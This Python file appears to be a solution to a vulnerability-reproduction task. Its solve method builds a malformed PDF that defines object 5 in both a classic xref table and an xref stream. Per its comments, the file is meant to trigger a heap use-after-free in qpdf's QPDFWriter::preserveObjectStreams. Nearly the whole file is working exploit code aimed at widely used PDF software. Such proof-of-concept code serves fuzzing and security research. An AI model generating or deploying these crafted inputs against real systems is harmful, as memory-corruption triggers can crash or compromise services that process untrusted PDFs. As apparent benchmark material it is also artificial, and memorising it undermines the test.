import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a PDF with a hybrid reference structure (XRef + XRefStm)
        # where an object is defined in both, causing "multiple entries for the same object id".
        # This triggers the specific Heap Use After Free vulnerability in QPDFWriter::preserveObjectStreams
        # when it attempts to manage the object cache.
        
        # 1. Header
        pdf_head = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"
        
        # 2. Objects
        
        # Obj 1: Catalog
        o1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        
        # Obj 2: Pages
        o2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Obj 3: Page
        o3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
        
        # Obj 4: Object Stream containing Obj 5
        # The stream content: "5 0 << >>"
        # "5 0" means object 5 is at offset 0.
        stm_data = b"5 0 << >>"
        stm_comp = zlib.compress(stm_data)
        # /First is offset of first object data (after the pair list "5 0 "). Length is 4.
        o4 = (f"4 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Length {len(stm_comp)} /Filter /FlateDecode >>\nstream\n".encode('latin-1') 
              + stm_comp + b"\nendstream\nendobj\n")
        
        # Obj 5: Standalone definition (The Conflict)
        # This object is defined here as a normal object, but also in ObjStm 4.
        o5 = b"5 0 obj\n<< /Type /ConflictObj >>\nendobj\n"
        
        # Obj 6: XRefStm
        # This stream defines Obj 5 as being type 2 (compressed) in stream 4.
        # Format W=[1, 2, 1]: Type(1) | Field2(2) | Field3(1)
        # Entry for Obj 5: 02 0004 00 (Type 2, Stream 4, Index 0)
        xr_stm_content = b"\x02\x00\x04\x00"
        o6 = (f"6 0 obj\n<< /Type /XRef /Size 7 /W [1 2 1] /Root 1 0 R /Index [5 1] /Length {len(xr_stm_content)} >>\nstream\n".encode('latin-1')
              + xr_stm_content + b"\nendstream\nendobj\n")

        # Layout the body
        body = pdf_head + o1 + o2 + o3 + o4 + o5 + o6
        
        # Calculate offsets
        off1 = len(pdf_head)
        off2 = off1 + len(o1)
        off3 = off2 + len(o2)
        off4 = off3 + len(o3)
        off5 = off4 + len(o4)
        off6 = off5 + len(o5)
        
        xref_offset = len(body)
        
        # Standard XRef Table
        # Defines 0-4 and 6 as normal.
        # CRUCIALLY: Defines 5 as normal at 'off5'.
        # This creates the conflict with XRefStm which says 5 is in stream 4.
        xref = b"xref\n0 7\n"
        xref += b"0000000000 65535 f \n"
        xref += f"{off1:010} 00000 n \n".encode('latin-1')
        xref += f"{off2:010} 00000 n \n".encode('latin-1')
        xref += f"{off3:010} 00000 n \n".encode('latin-1')
        xref += f"{off4:010} 00000 n \n".encode('latin-1')
        xref += f"{off5:010} 00000 n \n".encode('latin-1')
        xref += f"{off6:010} 00000 n \n".encode('latin-1')
        
        # Trailer
        # Points to the XRefStm at 'off6'.
        trailer = (f"trailer\n<< /Size 7 /Root 1 0 R /XRefStm {off6} >>\n".encode('latin-1'))
        
        footer = b"startxref\n" + f"{xref_offset}\n".encode('latin-1') + b"%%EOF\n"
        
        return body + xref + trailer + footer